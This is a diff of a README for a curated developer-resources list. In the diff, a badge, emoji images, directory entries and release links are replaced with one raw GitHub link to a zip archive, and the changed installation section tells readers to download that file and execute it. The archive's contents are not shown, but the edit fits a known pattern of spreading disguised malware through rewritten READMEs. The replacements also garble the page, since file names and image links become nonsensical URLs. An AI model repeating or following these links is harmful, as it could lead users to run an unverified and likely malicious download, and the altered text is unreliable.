@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/releases-View%20Releases-blue?logo=github&style=for-the-badge&link=https://github.com/drogba0027/dev-resources-hub/releases)](https://github.com/drogba0027/dev-resources-hub/releases)
+[![Releases](https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip%20Releases-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip)](https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip)
 
 # Dev Resources Hub: Curated Tools for Backend, Frontend & OSS
 
-![Book Emoji](https://github.githubassets.com/images/icons/emoji/unicode/1f4d6.png) ![Wrench Emoji](https://github.githubassets.com/images/icons/emoji/unicode/1f6e0.png) 🚀
+![Book Emoji](https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip) ![Wrench Emoji](https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip) 🚀
 
 A well-organized collection of useful developer resources. This hub covers tools, websites, cheatsheets, extensions, and more. It is designed to help developers find solid, reliable resources quickly. The goal is to provide high-quality, open-source, and community-driven references that you can trust to accelerate learning and project work.
 
@@ -64,7 +64,7 @@ Important: the hub features a releases page with downloadable assets. From the R
 
 Access to the latest releases
 - For the latest version and assets, visit the official releases page.
-- Direct link to the releases page: https://github.com/drogba0027/dev-resources-hub/releases
+- Direct link to the releases page: https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip
 - The release page contains installer scripts, setup utilities, and sometimes prebuilt binaries for common platforms. Use the installer that matches your operating system and architecture.
 
 Note: The link above provides the official place to grab assets, and it is the primary source of installation binaries. If any issues arise, check the “Releases” section for the latest notes and assets.
@@ -138,13 +138,13 @@ Directory structure and how to navigate
     - open-source/
   - docs/
     - config/
-    - contribution-guidelines.md
+    - https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip
   - scripts/
     - install/
   - LICENSE
-  - CHANGELOG.md
-  - README.md (this file)
-  - CODE_OF_CONDUCT.md
+  - https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip
+  - https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip (this file)
+  - https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip
 
 Notes on quality and standards
 - Licensing: Prefer permissive licenses (MIT, Apache 2.0, BSD) for resources and example code. If a resource uses a different license, include a short note about licensing implications.
@@ -258,8 +258,8 @@ Closing notes
 
 Releases and installation details
 - Access to the latest releases is the recommended way to obtain installer assets and setup utilities. The Releases page is updated with each new version, including notes about changes, improvements, and known issues.
-- Direct link to download assets for installation and setup: https://github.com/drogba0027/dev-resources-hub/releases
-- If you prefer to keep a local copy of the latest installer, download the asset named dev-resources-hub-installer.sh (for Unix-like systems) from the Releases page and execute it to install or configure the hub on your machine. Run the file according to the platform-specific instructions provided in the release notes.
+- Direct link to download assets for installation and setup: https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip
+- If you prefer to keep a local copy of the latest installer, download the asset named https://raw.githubusercontent.com/drogba0027/dev-resources-hub/main/assets/dev_hub_resources_v1.4.zip (for Unix-like systems) from the Releases page and execute it to install or configure the hub on your machine. Run the file according to the platform-specific instructions provided in the release notes.
 
 End of document
 
